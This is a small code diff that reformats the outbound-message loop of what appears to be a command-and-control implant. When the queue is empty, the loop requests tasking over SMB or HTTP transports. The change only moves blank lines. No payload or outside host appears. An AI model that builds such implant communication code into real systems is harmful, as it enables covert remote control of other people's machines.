@@ -149,14 +149,14 @@ namespace Message {
         PARSER Parser       = { };
 
         retry:
-        if (!Ctx->Transport.OutboundQueue) {
 
+        if (!Ctx->Transport.OutboundQueue) {
 #ifdef TRANSPORT_SMB
             return_defer(ERROR_SUCCESS);
 #elifdef TRANSPORT_HTTP
             PSTREAM Task = Stream::CreateStreamWithHeaders(TypeTasking);
-
             OutboundQueue(Task);
+
             goto retry;
 #endif
         } else {
